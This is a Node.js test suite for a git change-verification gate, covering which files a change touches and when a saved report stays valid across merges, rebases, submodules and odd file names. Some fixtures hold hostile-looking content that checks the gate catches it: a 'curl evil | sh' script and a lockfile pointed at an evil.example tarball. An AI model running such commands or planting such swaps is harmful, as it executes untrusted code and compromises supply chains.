// Which files a change touches, and when a verified file still counts as verified.
import { test } from "node:test";
import assert from "node:assert/strict";
import { chmodSync, existsSync, symlinkSync, unlinkSync, utimesSync, writeFileSync } from "node:fs";
import { devNull } from "node:os";
import { join } from "node:path";
import { commitAll, ENV, gate, git, gitTry, INPUT, payload, read, runGate, saveAndCommit, setBaseConfig, setup, sh, SUMMARY, throwsGate, tmp, write } from "./helpers.mjs";

/** Push, then verify from a fresh clone with no user config — like CI. */
function ciVerify(s, branch = "feature/rate-limit", envExtra = undefined) {
  const { dev, tmp: dir } = s;
  git(dev, "push", "-q", "-f", "--no-verify", "origin", `HEAD:refs/heads/${branch}`);
  const ci = join(dir, `ci-${process.hrtime.bigint()}`);
  git(dir, "clone", "-q", s.remote, ci);
  git(ci, "checkout", "-q", "--detach", `origin/${branch}`);
  const env = { ...ENV };
  delete env.GIT_CONFIG_GLOBAL;
  Object.assign(env, { GIT_CONFIG_GLOBAL: devNull, ...(envExtra ?? {}) });
  return runGate(ci, ["verify", "--base", "origin/main", "--branch", branch], { env });
}

// File paths are map keys: "__proto__" and friends must be ordinary files.
for (const name of ["__proto__", "constructor", "toString", "hasOwnProperty"]) {
  test(`a file named ${name} is a change like any other`, (t) => {
    const { dev } = setup(t);
    write(dev, name, "anything\n");
    commitAll(dev, `add ${name}`);
    const [changes] = gate.collectChanges(dev, "origin/main", "HEAD");
    assert.ok(Object.hasOwn(changes, name), `${name} missing from changes`);
    const [passed, problems] = gate.verify(dev);
    assert.equal(passed, false);
    assert.match(problems[0], /No ownership report/);
  });
}

test("verifying a path that isn't in the change is refused, even toString", (t) => {
  const { dev } = setup(t);
  write(dev, "src/app.js", "export const app = 2;\n");
  throwsGate(() => gate.save(payload({ "src/app.js": ["x"], toString: ["sneaky"] }), dev), /Not part of this change: toString/);
});

test("a sensitive file named constructor must be explicitly verified", (t) => {
  const { dev } = setup(t);
  setBaseConfig(dev, (c) => c.sensitive.push("constructor"));
  write(dev, "constructor", "x\n");
  write(dev, "src/app.js", "export const app = 2;\n");
  throwsGate(() => gate.save(payload({ "src/app.js": ["x"] }), dev), /constructor/);
  saveAndCommit(dev, { "src/app.js": ["x"], constructor: ["what it does"] });
  assert.equal(gate.verify(dev)[0], true);
});

// Non-UTF-8 file names fail closed instead of passing silently.
// The name goes straight into the index: APFS (macOS) refuses to create a file
// with it, and the gate only reads names from git anyway.
test("a non-UTF-8 file name fails closed", (t) => {
  const { dev } = setup(t);
  const blob = sh(dev, "git", ["hash-object", "-w", "--stdin"], { input: "x\n" }).stdout.trim();
  const entry = Buffer.concat([Buffer.from(`100644 ${blob}\tsrc/caf`), Buffer.from([0xe9]), Buffer.from(".js\n")]);
  sh(dev, "git", ["update-index", "--add", "--index-info"], { input: entry });
  git(dev, "commit", "-qm", "latin-1 name");
  throwsGate(() => gate.verify(dev), /not valid UTF-8/);
});

// Huge diffs don't hit argv limits; ':'-prefixed names work.
test("thousands of files and a name starting with a colon are handled", (t) => {
  const { dev } = setup(t);
  for (let i = 0; i < 3000; i++) {
    write(dev, `gen/very/long/directory/name/for/argv/limits/file_${String(i).padStart(5, "0")}.txt`, `${i}\n`);
  }
  write(dev, ":weird.js", "odd\n");
  gate.save(payload({ ":weird.js": ["why the odd name"] }), dev);
  commitAll(dev, "lots");
  const [passed, problems] = gate.verify(dev);
  assert.ok(passed, JSON.stringify(problems.slice(0, 2)));
});

// Performance: thousands of files in one pass.
test("a change of many files is checked quickly", (t) => {
  const { dev } = setup(t);
  for (let i = 0; i < 3000; i++) write(dev, `gen/f${String(i).padStart(5, "0")}.txt`, `${i}\n`);
  const start = Date.now();
  gate.save(payload({ "gen/f00000.txt": ["generator output"] }), dev);
  commitAll(dev, "lots");
  assert.ok(gate.verify(dev)[0]);
  // generous: shared CI runners are slow; this guards against O(n) git calls
  assert.ok((Date.now() - start) / 1000 < 90);
});

// Reserved .learning paths only hide plain files; symlinks/executables/submodules are changes.
test("only plain markdown at the reserved .learning/ paths is exempt", (t) => {
  const { dev } = setup(t);
  symlinkSync("/etc/hostname", join(dev, ".learning/map.md"));
  write(dev, ".learning/checks/run.md", "#!/bin/sh\necho hi\n");
  chmodSync(join(dev, ".learning/checks/run.md"), 0o755);
  commitAll(dev, "sneaky plumbing");
  const changes = gate.collectChanges(dev, "origin/main", "HEAD")[0];
  assert.deepEqual(new Set(Object.keys(changes)), new Set([".learning/map.md", ".learning/checks/run.md"]));
  assert.ok(!gate.verify(dev)[0]);
});

test("report.local.json is never part of the change; nothing else is exempt", (t) => {
  const { dev } = setup(t);
  assert.equal(gitTry(dev, "check-ignore", "-q", INPUT).status, 0);           // install ignores it
  write(dev, "src/app.js", "export const app = 2;\n");
  write(dev, INPUT, JSON.stringify(payload()));
  git(dev, "add", "-f", INPUT);                                               // even when tracked anyway
  const paths = () => gate.status(dev).files.map((f) => f.path);
  assert.deepEqual(paths(), ["src/app.js"]);
  write(dev, ".learning/x.local.json", "{}\n");                              // a look-alike is checked
  assert.deepEqual(paths(), [".learning/x.local.json", "src/app.js"]);
  unlinkSync(join(dev, ".learning/x.local.json"));
  chmodSync(join(dev, INPUT), 0o755);                                         // only as a plain file
  assert.deepEqual(paths(), [INPUT, "src/app.js"]);
});

// Ignored files are still tracked; plumbing patterns are exact.
test("ignored files are still tracked after the report, and the plumbing exemption is narrow", (t) => {
  const { dev } = setup(t);
  write(dev, "src/app.js", "require('./x');\n");
  write(dev, "package-lock.json", '{"resolved": "https://registry.npmjs.org/x.tgz"}\n');
  saveAndCommit(dev);
  assert.ok(gate.verify(dev)[0]);
  write(dev, "package-lock.json", '{"resolved": "https://evil.example/x.tgz"}\n');
  commitAll(dev, "swap tarball");
  const [passed, problems] = gate.verify(dev);
  assert.ok(!passed && problems[0].includes("package-lock.json"), JSON.stringify(problems));

  for (const sneaky of [".learning/checks/helper.js", ".learning/checks/sub/x.md", ".learning/decisions/run.sh"]) {
    assert.ok(!gate.isPlumbing(sneaky), sneaky);
  }
  for (const real of [".learning/checks/feature%2Fx.md", ".learning/decisions/0001-x.md", ".learning/map.md",
    ".learning/me.local.md", ".github/CODEOWNERS"]) {
    assert.ok(gate.isPlumbing(real), real);
  }
});

// Hooks don't run on the throwaway index; untracked files are covered like any other.
test("the temporary index runs no git hooks, and untracked files count", (t) => {
  const { dev } = setup(t);
  const hook = join(dev, ".git/hooks/post-index-change");
  const marker = join(dev, "hook-ran");
  writeFileSync(hook, `#!/bin/sh\ntouch '${marker}'\n`);
  chmodSync(hook, 0o755);
  write(dev, "src/app.js", "export const app = 2;\n");
  gate.status(dev);
  assert.ok(!existsSync(marker));

  gate.save(payload(), dev);
  write(dev, "src/brand_new.js", "new code\n"); // untracked, after the report
  assert.deepEqual(gate.status(dev).must_verify, ["src/brand_new.js"]);
});

// Git's "racy clean" case. A same-size
// edit whose stat data matches the index must still be seen.
test("a same-size edit with identical stat data is detected (racy git)", (t) => {
  const { dev } = setup(t);
  git(dev, "config", "core.trustctime", "false");
  git(dev, "config", "core.checkStat", "minimal");
  const app = join(dev, "src/app.js");
  const ts = 1_700_000_000;
  utimesSync(app, ts, ts);
  git(dev, "add", "src/app.js");
  utimesSync(join(dev, ".git/index"), ts, ts);
  writeFileSync(app, "export const app = 9;\n"); // same size as "= 1;"
  utimesSync(app, ts, ts); // identical mtime + size
  assert.deepEqual(gate.status(dev).files.map((f) => f.path), ["src/app.js"]);
});

// The developer's git config, attributes and env can't make local and CI disagree.
test("user git config and env don't change fingerprints", (t) => {
  const s = setup(t);
  const { dev, tmp: dir } = s;
  const tmpPath = tmp(t);
  const lib = join(dir, "lib");
  git(dir, "init", "-q", "-b", "main", lib);
  write(lib, "l.txt", "1\n");
  commitAll(lib, "l1");
  git(dev, "-c", "protocol.file.allow=always", "submodule", "add", "-q", lib, "vendor/lib");
  const attrs = join(tmpPath, "attrs");
  writeFileSync(attrs, "*.py -diff\n*.txt diff=weird\n");
  for (const [k, v] of Object.entries({
    "diff.suppressBlankEmpty": "true", "diff.submodule": "log", "core.bigFileThreshold": "1",
    "core.attributesFile": attrs, "diff.weird.binary": "true", "diff.algorithm": "patience",
    "color.ui": "always", "diff.noprefix": "true", "core.quotePath": "false",
    "diff.relative": "true", "core.pager": "cat",
  })) {
    git(dev, "config", k, v);
  }
  write(dev, "src/big.py", Array.from({ length: 2000 }, (_, i) => `x${i} = ${i}\n\n`).join(""));
  write(dev, "notes.txt", "a\n\nb\n");
  const env = { ...ENV, GIT_DIFF_OPTS: "--unified=1" };
  const msg = runGate(dev, ["save"], {
    input: JSON.stringify(payload({ "src/big.py": ["generated constants"], "vendor/lib": ["why vendored"] })),
    env,
  });
  assert.equal(msg.status, 0, msg.stderr);
  commitAll(dev, "change under odd config");
  const r = ciVerify(s);
  assert.equal(r.status, 0, r.stdout + r.stderr);
});

// CRLF files committed before a text=auto rule: local == CI.
test("a CRLF file with a later .gitattributes fingerprints the same locally and in CI", (t) => {
  const { dev } = setup(t);
  git(dev, "checkout", "-q", "main");
  writeFileSync(join(dev, "src/win.txt"), Buffer.from("a\r\nb\r\n", "latin1"));
  commitAll(dev, "crlf file");
  writeFileSync(join(dev, ".gitattributes"), "* text=auto\n");
  commitAll(dev, "attrs");
  git(dev, "push", "-q", "origin", "main");
  git(dev, "checkout", "-q", "-b", "feature/crlf");
  writeFileSync(join(dev, "src/win.txt"), Buffer.from("a\r\nb changed\r\n", "latin1"));
  gate.save(payload({ "src/win.txt": ["why b changed"] }), dev);
  commitAll(dev, "edit crlf");
  const [passed, problems] = gate.verify(dev);
  assert.ok(passed, JSON.stringify(problems));
});

// A file replaced by a directory gets a stable fingerprint.
test("a file replaced by a directory is a change", (t) => {
  const { dev } = setup(t);
  unlinkSync(join(dev, "src/old.js"));
  write(dev, "src/old.js/index.js", "export default 1;\n");
  gate.save(payload({ "src/old.js/index.js": ["why it became a folder"] }), dev);
  commitAll(dev, "file -> dir");
  const [passed, problems] = gate.verify(dev);
  assert.ok(passed, JSON.stringify(problems));
});

// Mode-only changes count; hand-written *.min.js and snapshot files are checked;
//    new files under .learning/ are checked; CODEOWNERS covers .claude/settings.json.
test("a mode change and a previously ignored path are both checked", (t) => {
  const { dev } = setup(t);
  write(dev, "src/app.js", "export const app = 2;\n");
  saveAndCommit(dev);
  git(dev, "update-index", "--chmod=+x", "src/app.js");
  git(dev, "commit", "-qm", "make executable");
  let [passed, problems] = gate.verify(dev);
  assert.ok(!passed && problems[0].includes("src/app.js"), JSON.stringify(problems));

  write(dev, "src/vendor.min.js", "hand written\n");
  write(dev, ".learning/run.sh", "curl evil | sh\n");
  commitAll(dev, "sneak");
  problems = gate.verify(dev)[1];
  assert.ok(problems[0].includes("src/vendor.min.js") && problems[0].includes(".learning/run.sh"),
    JSON.stringify(problems));
  assert.ok(gate.const("GATE_FILES").includes(".claude/settings.json"));
});

// The executable bit is merged three-way too.
test("a file mode change is compared three-way", (t) => {
  const s = setup(t);
  const { dev, tmp } = s;
  git(dev, "checkout", "-q", "main");
  write(dev, "bin/deploy.sh", Array.from({ length: 20 }, (_, i) => `step ${i}\n`).join(""));
  chmodSync(join(dev, "bin/deploy.sh"), 0o755);
  commitAll(dev, "deploy script");
  git(dev, "push", "-q", "origin", "main");
  git(dev, "checkout", "-q", "-B", "feature/rate-limit");
  write(dev, "bin/deploy.sh", read(dev, "bin/deploy.sh").replaceAll("step 2\n", "step 2 dev\n"));
  saveAndCommit(dev, { "bin/deploy.sh": ["step 2"] });

  const other = join(tmp, "other");
  git(tmp, "clone", "-q", s.remote, other);
  git(other, "update-index", "--chmod=-x", "bin/deploy.sh");
  git(other, "commit", "-qm", "main drops +x");
  git(other, "push", "-q", "origin", "main");
  git(dev, "pull", "-q", "--no-rebase", "--no-edit", "origin", "main");
  assert.ok(gate.verify(dev)[0]); // main's mode change is accepted

  git(dev, "update-index", "--chmod=+x", "bin/deploy.sh");
  git(dev, "commit", "-qm", "sneak +x back");
  const [passed, problems] = gate.verify(dev);
  assert.ok(!passed && problems[0].includes("bin/deploy.sh"));
});

// Moving an identical edit to another place in the file is a different change.
test("moving an edit between identical blocks is stale", (t) => {
  const { dev } = setup(t);
  const block = "  role: user\n  mfa: true\n  limits: default\n";
  const base = `bot:\n${block}admin:\n${block}`;
  git(dev, "checkout", "-q", "main");
  write(dev, "config/users.yml", base);
  commitAll(dev, "users");
  git(dev, "push", "-q", "origin", "main");
  git(dev, "checkout", "-q", "-B", "feature/rate-limit");
  // Replaces the first occurrence only: the bot's block.
  write(dev, "config/users.yml", base.replace("bot:\n  role: user\n  mfa: true", "bot:\n  role: user\n  mfa: false"));
  saveAndCommit(dev, { "config/users.yml": ["MFA off for the test bot"] });
  assert.ok(gate.verify(dev)[0]);
  const moved = base.replaceAll("admin:\n  role: user\n  mfa: true", "admin:\n  role: user\n  mfa: false");
  write(dev, "config/users.yml", moved);
  commitAll(dev, "move the edit to admin");
  const [passed, problems] = gate.verify(dev);
  assert.ok(!passed && problems[0].includes("config/users.yml"), JSON.stringify(problems));
});

// Merging main into the branch doesn't force a re-check unless main touched the same lines.
test("merging main keeps the report valid when the edits don't overlap", (t) => {
  const s = setup(t);
  const { dev, tmp: dir } = s;
  const base = Array.from({ length: 40 }, (_, i) => `line ${i}\n`).join("");
  git(dev, "checkout", "-q", "main");
  write(dev, "src/big.js", base);
  commitAll(dev, "big file");
  git(dev, "push", "-q", "origin", "main");
  git(dev, "checkout", "-q", "-B", "feature/rate-limit");
  write(dev, "src/big.js", base.replaceAll("line 3\n", "line 3 changed by dev\n"));
  saveAndCommit(dev, { "src/big.js": ["why line 3"] });

  const other = join(dir, "other");
  git(dir, "clone", "-q", s.remote, other);
  write(other, "src/big.js", base.replaceAll("line 35\n", "line 35 changed on main\n"));
  commitAll(other, "main edits far away");
  git(other, "push", "-q", "origin", "main");

  git(dev, "pull", "-q", "--no-rebase", "--no-edit", "origin", "main");
  let [passed, problems] = gate.verify(dev, { base: "origin/main" });
  assert.ok(passed, JSON.stringify(problems));

  // ...main touching nearby lines is fine too: the dev's change itself is unchanged
  write(other, "src/big.js", read(other, "src/big.js").replaceAll("line 6\n", "line 6 main\n"));
  commitAll(other, "main edits two lines away");
  git(other, "push", "-q", "origin", "main");
  git(dev, "pull", "-q", "--no-rebase", "--no-edit", "origin", "main");
  assert.ok(gate.verify(dev, { base: "origin/main" })[0]);

  // ...but when main edits the same line, the conflict resolution is new code: re-check
  write(other, "src/big.js", read(other, "src/big.js").replaceAll("line 3\n", "line 3 main\n"));
  commitAll(other, "main edits the dev's line");
  git(other, "push", "-q", "origin", "main");
  const r = gitTry(dev, "pull", "-q", "--no-rebase", "--no-edit", "origin", "main");
  assert.notEqual(r.status, 0); // conflict
  const resolved = read(other, "src/big.js").replaceAll("line 3 main\n", "line 3 changed by dev + main\n");
  write(dev, "src/big.js", resolved);
  commitAll(dev, "resolve conflict");
  [passed, problems] = gate.verify(dev, { base: "origin/main" });
  assert.ok(!passed && problems[0].includes("src/big.js"), JSON.stringify(problems));
});

// The 3-way acceptance only forgives the base's own edits — nothing sneaks in alongside.
test("a merge from main can't smuggle in extra edits", (t) => {
  const s = setup(t);
  const { dev, tmp: dir } = s;
  const base = Array.from({ length: 40 }, (_, i) => `line ${i}\n`).join("");
  git(dev, "checkout", "-q", "main");
  write(dev, "src/big.js", base);
  commitAll(dev, "big file");
  git(dev, "push", "-q", "origin", "main");
  git(dev, "checkout", "-q", "-B", "feature/rate-limit");
  write(dev, "src/big.js", base.replaceAll("line 3\n", "line 3 dev\n"));
  saveAndCommit(dev, { "src/big.js": ["line 3"] });
  const other = join(dir, "other");
  git(dir, "clone", "-q", s.remote, other);
  write(other, "src/big.js", base.replaceAll("line 30\n", "line 30 main\n"));
  commitAll(other, "main");
  git(other, "push", "-q", "origin", "main");
  git(dev, "fetch", "-q", "origin");
  gitTry(dev, "merge", "-q", "--no-commit", "origin/main");
  write(dev, "src/big.js", read(dev, "src/big.js").replaceAll("line 20\n", "line 20 SNEAKY\n"));
  commitAll(dev, "merge main (plus an unreviewed edit)");
  const [passed, problems] = gate.verify(dev, { base: "origin/main" });
  assert.ok(!passed && problems[0].includes("src/big.js"), JSON.stringify(problems));
});

// Rebase: local and CI agree; re-saving needs no new questions.
test("after a rebase, saving again needs no new questions", (t) => {
  const s = setup(t);
  const { dev, tmp } = s;
  const base = Array.from({ length: 40 }, (_, i) => `line ${i}\n`).join("");
  git(dev, "checkout", "-q", "main");
  write(dev, "src/big.js", base);
  commitAll(dev, "big");
  git(dev, "push", "-q", "origin", "main");
  git(dev, "checkout", "-q", "-B", "feature/rate-limit");
  write(dev, "src/big.js", base.replaceAll("line 3\n", "line 3 dev\n"));
  saveAndCommit(dev, { "src/big.js": ["why line 3"] });
  const other = join(tmp, "other");
  git(tmp, "clone", "-q", s.remote, other);
  write(other, "src/big.js", base.replaceAll("line 30\n", "line 30 main\n"));
  commitAll(other, "main");
  git(other, "push", "-q", "origin", "main");
  git(dev, "fetch", "-q", "origin");
  git(dev, "rebase", "-q", "origin/main");

  const [passed, problems] = gate.verify(dev); // local agrees with CI now
  assert.ok(!passed && problems[0].includes("save the report again"));
  assert.deepEqual(gate.status(dev).files.map((f) => f.state), ["rebased"]);
  assert.deepEqual(gate.status(dev).must_verify, []);
  gate.save({ summary: SUMMARY, verified: {} }, dev); // no new answers needed
  commitAll(dev, "re-save after rebase");
  assert.ok(gate.verify(dev)[0]);

  // merging (instead of rebasing) needs nothing
  write(other, "src/big.js", read(other, "src/big.js").replaceAll("line 35\n", "line 35 main\n"));
  commitAll(other, "main again");
  git(other, "push", "-q", "origin", "main");
  git(dev, "pull", "-q", "--no-rebase", "--no-edit", "origin", "main");
  assert.ok(gate.verify(dev)[0]);
});

// Submodules with ignore=all must still count as changes.
test("a submodule bump is visible even with ignore=all", (t) => {
  const { dev, tmp: dir } = setup(t);
  const lib = join(dir, "lib");
  git(dir, "init", "-q", "-b", "main", lib);
  write(lib, "l.txt", "1\n");
  commitAll(lib, "l1");
  const allow = ["-c", "protocol.file.allow=always"];
  git(dev, ...allow, "submodule", "add", "-q", lib, "vendor/lib");
  git(dev, "config", "-f", ".gitmodules", "submodule.vendor/lib.ignore", "all");
  commitAll(dev, "add submodule");
  assert.ok(!gate.verify(dev)[0]); // adding it must be checked
  assert.ok(gate.status(dev).must_verify.includes("vendor/lib") ||
    gate.status(dev).files.map((f) => f.path).includes("vendor/lib"));
  saveAndCommit(dev, { "vendor/lib": ["why we vendor lib"] });
  assert.ok(gate.verify(dev)[0]);

  write(lib, "l.txt", "2 (unreviewed)\n");
  commitAll(lib, "l2");
  git(join(dev, "vendor/lib"), "pull", "-q", "origin", "main");
  commitAll(dev, "bump submodule");
  const [passed, problems] = gate.verify(dev);
  assert.ok(!passed && problems[0].includes("vendor/lib"), JSON.stringify(problems));
});

// Submodules are always sensitive; a gitlink at a sensitive path matches the folder pattern.
test("a submodule at a sensitive path is sensitive", (t) => {
  const { dev, tmp } = setup(t);
  const lib = join(tmp, "payments-lib");
  git(tmp, "init", "-q", "-b", "main", lib);
  write(lib, "pay.txt", "1\n");
  commitAll(lib, "p1");
  git(dev, "-c", "protocol.file.allow=always", "submodule", "add", "-q", lib, "vendor/payments");
  write(dev, "src/app.js", "export const app = 2;\n");
  const st = gate.status(dev);
  assert.ok(st.must_verify.includes("vendor/payments"));
  throwsGate(() => gate.save(payload({ "src/app.js": ["x"] }), dev), /vendor\/payments/);
  assert.ok(gate.isSensitive("vendor/payments", "120000", { sensitive: ["**/payments/**"] }));
});

test("any submodule bump is sensitive even on a plain path", (t) => {
  const { dev, tmp } = setup(t);
  const lib = join(tmp, "plain-lib");
  git(tmp, "init", "-q", "-b", "main", lib);
  write(lib, "x.txt", "1\n");
  commitAll(lib, "x");
  git(dev, "-c", "protocol.file.allow=always", "submodule", "add", "-q", lib, "third_party/lib");
  write(dev, "src/app.js", "export const app = 2;\n");
  assert.ok(gate.status(dev).must_verify.includes("third_party/lib"));
  throwsGate(() => gate.save(payload({ "src/app.js": ["x"] }), dev), /third_party\/lib/);
});

test("a submodule named __proto__ is still sensitive and still checked", (t) => {
  const { dev, tmp: dir } = setup(t);
  const lib = join(dir, "lib");
  git(dir, "init", "-q", "-b", "main", lib);
  write(lib, "x.txt", "1\n");
  commitAll(lib, "x");
  git(dev, "-c", "protocol.file.allow=always", "submodule", "add", "-q", lib, "__proto__");
  write(dev, "src/app.js", "export const app = 2;\n");
  assert.ok(gate.status(dev).must_verify.includes("__proto__"));
  throwsGate(() => gate.save(payload({ "src/app.js": ["x"] }), dev), /__proto__/);
});
